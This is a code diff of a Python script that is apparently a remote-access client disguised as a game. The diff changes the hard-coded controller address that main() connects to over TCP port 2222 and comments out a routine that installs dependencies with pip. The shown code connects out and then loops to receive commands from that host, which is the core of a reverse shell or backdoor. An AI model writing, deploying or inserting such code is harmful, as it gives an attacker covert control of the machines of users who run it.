@@ -78,7 +78,7 @@ def create_thing(get_cmd,sock):
 
 def main():
     sock = st.socket(st.AF_INET, st.SOCK_STREAM)
-    sock.connect(('192.168.81.156',2222))
+    sock.connect(('192.168.81.36',2222))
 
     while True:
         get_cmd = sock.recv(1024).decode().strip()
@@ -167,13 +167,13 @@ def main():
     # os.system('clear')
     # print('Game window closed...')
 
-def check_dependencies():
-    dependencies = ['sys','os','shutil','platform','os','colorama','psutil']
+# def check_dependencies():
+#     dependencies = ['sys','os','shutil','platform','os','colorama','psutil']
 
-    for dep in dependencies:
-        try:
-            importlib.import_module(dep)
-            print('installed')
-        except:
-            os.system('python -m pip install {}'.format(dep))
+#     for dep in dependencies:
+#         try:
+#             importlib.import_module(dep)
+#             print('installed')
+#         except:
+#             os.system('python -m pip install {}'.format(dep))
 
